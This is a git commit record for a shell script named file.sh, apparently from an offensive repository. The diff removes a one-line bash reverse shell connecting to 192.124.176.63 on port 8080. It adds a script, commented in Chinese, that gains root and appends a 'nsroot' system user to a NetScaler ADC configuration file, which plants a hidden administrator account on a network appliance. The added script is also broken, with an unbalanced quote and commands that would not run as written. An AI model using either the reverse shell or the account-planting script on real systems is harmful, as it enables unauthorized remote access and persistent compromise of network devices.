b51be428b0a2321d2d78f1c5a2d31d10afd0f651
ggbtty <146180372+ggbtty@users.noreply.github.com>
2023-09-28 09:34:58 +0800

    Update file.sh

--- file.sh
+++ file.sh
@@ -1,1 +1,17 @@
-bash -i >& /dev/tcp/192.124.176.63/8080 0>&1
+#!/bin/bash
+
+# NetScaler ADC 配置文件路径
+config_file="/nsconfig/ns.conf"
+
+# 要进行的配置更改
+new_config=add system user tty nsroot"
+
+# 使用 root 权限编辑配置文件
+sudo -i
+echo "$new_config" >> "$config_file"
+
+# 保存配置更改
+save config
+
+# 退出 root 权限
+exit
